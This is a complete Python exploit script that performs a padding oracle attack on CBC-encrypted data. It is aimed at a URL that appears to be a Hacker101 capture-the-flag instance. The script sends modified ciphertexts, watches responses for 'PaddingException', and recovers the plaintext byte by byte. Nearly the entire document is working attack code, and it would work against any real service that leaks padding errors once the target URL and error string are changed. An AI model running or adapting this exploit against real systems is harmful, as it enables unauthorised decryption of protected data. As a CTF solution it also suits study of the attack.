#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, re, requests
from base64 import b64encode
from itertools import cycle

def test_validity(response, error):
    data = response.text
    if data.find(error) == -1:
        return 1
    return 0

def call_oracle(conn, url, up_cipher):
    b64 = b64encode(bytes.fromhex(up_cipher)).decode()
    b64 = b64.replace('=', '~').replace('/', '!').replace('+', '-')
    response = conn.get(url + b64)
    return conn, response


def split_len(seq, length):
    return [seq[i : i + length] for i in range(0, len(seq), length)]


def block_search_byte(size_block, i, pos, l):
    hex_char = hex(pos).split("0x")[1]
    return (
        "00" * (size_block - (i + 1))
        + ("0" if len(hex_char) % 2 != 0 else '')
        + hex_char
        + ''.join(l)
    )


def block_padding(size_block, i):
    l = []
    for t in range(0, i + 1):
        l.append(
            ("0" if len(hex(i + 1).split("0x")[1]) % 2 != 0 else '')
            + (hex(i + 1).split("0x")[1])
        )
    return "00" * (size_block - (i + 1)) + ''.join(l)


def hex_xor(s1, s2):
    b = bytearray()
    for c1, c2 in zip(bytes.fromhex(s1), cycle(bytes.fromhex(s2))):
        b.append(c1 ^ c2)
    return b.hex()


def run(cipher):
    #cipher = 'd2c6dd4c2a41f7ed5f0408ef4e31721dde55d1674026226fad1b7c11f0be754b7c7f02f501c2b4a237de28aa533e3568f3b2020170edc08372d7f5d93835d3b8e4cb7980ce188dd2b9b4f6a5ac5dd181037732af3558993edeb80703a895465167a0bfc96a6027f668383ddc246a6d9a9270ce76eb41bf67076ebadc958bab9019c42b714005addd5a1ab3c85b3c841086e6e8d559278fcfb88df04b22dfc7ec'
    size_block = 16
    url = 'https://2e0103df42b4a940a9dc1da7cdad7900.ctf.hacker101.com/?post='
    error = 'PaddingException'

    cipher = cipher.upper()
    found = False
    valide_value = []
    result = []
    len_block = size_block * 2
    cipher_block = split_len(cipher, len_block)

    conn = requests.Session()

    if len(cipher_block) == 1:
        print("[-] Abort there is only one block")
        sys.exit()
    for block in reversed(range(1, len(cipher_block))):
        if len(cipher_block[block]) != len_block:
            print("[-] Abort length block doesn't match the size_block")
            break
        print("[+] Search value block : ", block, "\n")
        for i in range(0, size_block):
            for ct_pos in range(0, 256):
                # 1 xor 1 = 0 or valide padding need to be checked
                if ct_pos != i + 1 or (
                    len(valide_value) > 0 and int(valide_value[-1], 16) == ct_pos
                ):

                    bk = block_search_byte(size_block, i, ct_pos, valide_value)
                    bp = cipher_block[block - 1]
                    bc = block_padding(size_block, i)

                    tmp = hex_xor(bk, bp)
                    cb = hex_xor(tmp, bc).upper()

                    up_cipher = cb + cipher_block[block]

                    if not conn:
                        print('Reopen connection')
                        conn = requests.Session()

                    connection, response = call_oracle(conn, url, up_cipher)

                    exe = re.findall("..", cb)
                    discover = ('').join(exe[size_block - i : size_block])
                    current = ('').join(exe[size_block - i - 1 : size_block - i])
                    find_me = ('').join(exe[: -i - 1])
                    sys.stdout.write(
                        "\033[2K\r[+] Test [Byte %03i/256 - Block %d ]: \033[31m%s\033[33m%s\033[36m%s\033[0m"
                        % (ct_pos, block, find_me, current, discover)
                    )
                    sys.stdout.flush()

                    if test_validity(response, error):
                        found = True
                        connection.close()

                        value = re.findall("..", bk)
                        valide_value.insert(0, value[size_block - (i + 1)])

                        bytes_found = ''.join(valide_value)
                        if (
                            i == 0
                            and int(bytes_found, 16) > size_block
                            and block == len(cipher_block) - 1
                        ):
                            print(
                                "[-] Error decryption failed the padding is > "
                                + str(size_block)
                            )
                            #sys.exit()

                        print(
                            "\n\033[36m" + "\033[1m" + "[+]" + "\033[0m" + " Found",
                            i + 1,
                            "bytes :",
                            bytes_found,
                            "\n"
                        )
                        break

            if found == False:
                # lets say padding is 01 for the last byte of the last block (the padding block)
                if len(cipher_block) - 1 == block and i == 0:
                    value = re.findall("..", bk)
                    valide_value.insert(0, "01")

                    print("\n[-] No padding found, but maybe the padding is length 01 :)\n")
                    bytes_found = ''.join(valide_value)
                else:
                    print("\n[-] Error decryption failed")
                    result.insert(0, ''.join(valide_value))
                    hex_r = ''.join(result)
                    print("[+] Partial Decrypted value (HEX):", hex_r.upper())
                    padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
                    print(
                        "[+] Partial Decrypted value (ASCII):",
                        bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
                    )
                    sys.exit()
            found = False

        result.insert(0, ''.join(valide_value))
        valide_value = []

    hex_r = ''.join(result)
    print("\n[+] Decrypted value (HEX):", hex_r.upper())
    padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
    print(
        "[+] Decrypted value (ASCII):",
        bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
    )


if __name__ == "__main__":
    run(sys.argv[1])
